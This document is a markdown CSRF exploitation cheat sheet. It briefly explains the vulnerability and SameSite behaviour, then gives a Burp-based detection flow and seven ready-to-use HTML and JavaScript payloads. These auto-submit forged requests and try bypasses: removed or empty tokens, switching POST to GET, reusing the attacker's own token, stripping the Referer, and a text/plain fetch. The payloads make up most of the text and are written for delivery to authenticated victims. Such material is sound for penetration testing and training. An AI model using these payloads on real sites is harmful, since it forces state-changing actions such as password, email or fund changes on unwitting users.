# 🎭 Cross-Site Request Forgery (CSRF)

---

## 📖 Description

Cross-Site Request Forgery (CSRF) is a vulnerability that tricks an authenticated user into unknowingly submitting a malicious request to a web application. Because the browser automatically includes cookies with every request, if the victim is logged in, the server sees the forged request as legitimate.

The attack requires three conditions to work:

- The **victim is authenticated** in the target application.
- The **action is state-changing** (password change, email update, fund transfer, etc.).
- The application **relies solely on cookies** to identify the user, with no unpredictable token to validate the request's origin.

The exploit is delivered as an HTML page — when the victim opens it, their browser silently fires the forged request in the background.

> If the session cookie uses `SameSite=Strict`, CSRF is blocked entirely. `SameSite=Lax` only protects top-level GET requests. `SameSite` absent or set to `None` → vulnerable.

---

## 🔎 Detection

```
1. Intercept a legitimate request with Burp

2. Is there a CSRF token?

   NO → Use payload 1️⃣ directly

   YES → Try bypasses in order:
         → Remove the token entirely      (payload 2️⃣)
         → Empty the token value          (payload 3️⃣)
         → Change POST to GET             (payload 4️⃣)
         → Use the attacker's own token   (payload 5️⃣)
         → Strip the Referer header       (payload 6️⃣)
         → Switch Content-Type to JSON    (payload 7️⃣)

3. If any works → build the final exploit and deliver it
```

> Save the exploit as `.html` and open it in the browser to test it. The victim must be authenticated in the target application for the attack to succeed.

---

## 💥 Exploitation

---

### 1️⃣ No CSRF token — directly vulnerable

The application performs no origin validation at all. A simple auto-submitting form is enough:

```html
<html>
  <body>
    <form id="csrf-form" action="http://TARGET/VULNERABLE_ENDPOINT" method="POST">
      <input type="hidden" name="PARAM_1" value="MALICIOUS_VALUE" />
      <input type="hidden" name="PARAM_2" value="MALICIOUS_VALUE" />
    </form>
    <script>
      document.getElementById('csrf-form').submit();
    </script>
  </body>
</html>
```

---

### 2️⃣ Bypass — Remove token entirely

Some applications only validate the token if it's present. If the parameter is simply absent, validation is skipped:

```html
<html>
  <body>
    <form id="csrf-form" action="http://TARGET/VULNERABLE_ENDPOINT" method="POST">
      <input type="hidden" name="VULNERABLE_PARAM" value="MALICIOUS_VALUE" />
      <!-- CSRF token field removed entirely -->
    </form>
    <script>
      document.getElementById('csrf-form').submit();
    </script>
  </body>
</html>
```

---

### 3️⃣ Bypass — Empty token value

The token field is present but empty. Some validators only check for the field's existence, not its value:

```html
<html>
  <body>
    <form id="csrf-form" action="http://TARGET/VULNERABLE_ENDPOINT" method="POST">
      <input type="hidden" name="VULNERABLE_PARAM" value="MALICIOUS_VALUE" />
      <input type="hidden" name="TOKEN_NAME" value="" />
    </form>
    <script>
      document.getElementById('csrf-form').submit();
    </script>
  </body>
</html>
```

---

### 4️⃣ Bypass — Change POST to GET

Some endpoints accept both methods. If the CSRF token is only validated on POST, switching to GET bypasses it:

```html
<html>
  <body>
    <form id="csrf-form" action="http://TARGET/VULNERABLE_ENDPOINT" method="GET">
      <input type="hidden" name="VULNERABLE_PARAM" value="MALICIOUS_VALUE" />
    </form>
    <script>
      document.getElementById('csrf-form').submit();
    </script>
  </body>
</html>
```

---

### 5️⃣ Bypass — Use attacker's own valid token

If the application validates that the token exists and is valid, but doesn't tie it to a specific session, a token obtained from the attacker's own account will be accepted:

```html
<html>
  <body>
    <form id="csrf-form" action="http://TARGET/VULNERABLE_ENDPOINT" method="POST">
      <input type="hidden" name="VULNERABLE_PARAM" value="MALICIOUS_VALUE" />
      <input type="hidden" name="TOKEN_NAME" value="ATTACKER_VALID_TOKEN" />
    </form>
    <script>
      document.getElementById('csrf-form').submit();
    </script>
  </body>
</html>
```

---

### 6️⃣ Bypass — Strip the Referer header

Some applications validate the `Referer` header instead of using a token. The `referrer` meta tag instructs the browser not to send it:

```html
<html>
  <head>
    <meta name="referrer" content="never">
  </head>
  <body>
    <form id="csrf-form" action="http://TARGET/VULNERABLE_ENDPOINT" method="POST">
      <input type="hidden" name="VULNERABLE_PARAM" value="MALICIOUS_VALUE" />
    </form>
    <script>
      document.getElementById('csrf-form').submit();
    </script>
  </body>
</html>
```

---

### 7️⃣ Bypass — JSON Content-Type via fetch

When the endpoint only accepts JSON and the application relies on `Content-Type: application/json` as an implicit origin check, using `text/plain` with a JSON body can bypass it — since `text/plain` is a simple request type that doesn't trigger CORS preflight:

```html
<html>
  <body>
    <script>
      fetch("http://TARGET/VULNERABLE_ENDPOINT", {
        method: "POST",
        credentials: "include",
        headers: {"Content-Type": "text/plain"},
        body: '{"PARAM":"MALICIOUS_VALUE"}'
      });
    </script>
  </body>
</html>
```
